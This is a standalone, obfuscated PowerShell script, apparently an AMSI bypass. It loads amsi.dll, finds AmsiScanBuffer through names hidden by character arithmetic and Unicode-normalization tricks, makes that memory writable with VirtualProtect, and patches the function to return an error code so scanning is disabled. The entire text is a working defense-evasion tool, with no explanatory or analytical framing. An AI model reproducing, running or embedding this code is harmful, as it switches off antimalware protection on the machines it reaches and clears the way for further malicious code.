$uDVrbOpZfWJun3p9E = @"
using System;
using System.Runtime.InteropServices;
public class uDVrbOpZfWJun3p9E {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr IEY6, string Mwm);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr dDKxZEeuEzvXK899nr, UIntPtr PMvAY, uint _3nMkey3QKt, out uint Uox);
}
"@

Add-Type $uDVrbOpZfWJun3p9E

$ueattaAtKBF = [uDVrbOpZfWJun3p9E]::LoadLibrary("$(('ãmsî'+'.dll').nORmALIZE([ChAr](70)+[ChaR](2+109)+[chAR](114+66-66)+[CHar]([Byte]0x6d)+[cHaR](68+54-54)) -replace [char]([BYtE]0x5c)+[chAR]([byTE]0x70)+[cHar]([byTe]0x7b)+[Char]([ByTE]0x4d)+[cHAr]([bYtE]0x6e)+[ChAr](125*84/84))")
$Tbn2WLIZRDWNAjqRv = [uDVrbOpZfWJun3p9E]::GetProcAddress($ueattaAtKBF, "$(('ÂmsîScânB'+'ùffêr').NoRmALIZe([cHaR]([BYTE]0x46)+[CHaR](111+2-2)+[CHAR](114*11/11)+[Char](109+35-35)+[CHaR](68)) -replace [chaR](92*37/37)+[Char]([byTE]0x70)+[Char](123*104/104)+[cHaR](28+49)+[CHar]([ByTE]0x6e)+[cHAr](125*105/105))")
$p = 0
[uDVrbOpZfWJun3p9E]::VirtualProtect($Tbn2WLIZRDWNAjqRv, [uint32]5, 0x40, [ref]$p)
$KM6 = "0xB8"
$tQba2En2ds00 = "0x57"
$cS45 = "0x00"
$dvtxlrKBFTBAK6z = "0x07"
$MIpkwnyODaym_pj = "0x80"
$TTUVc5IECQRkv7q = "0xC3"
$g0jahFE5KeM__7Mj = [Byte[]] ($KM6,$tQba2En2ds00,$cS45,$dvtxlrKBFTBAK6z,+$MIpkwnyODaym_pj,+$TTUVc5IECQRkv7q)
[System.Runtime.InteropServices.Marshal]::Copy($g0jahFE5KeM__7Mj, 0, $Tbn2WLIZRDWNAjqRv, 6)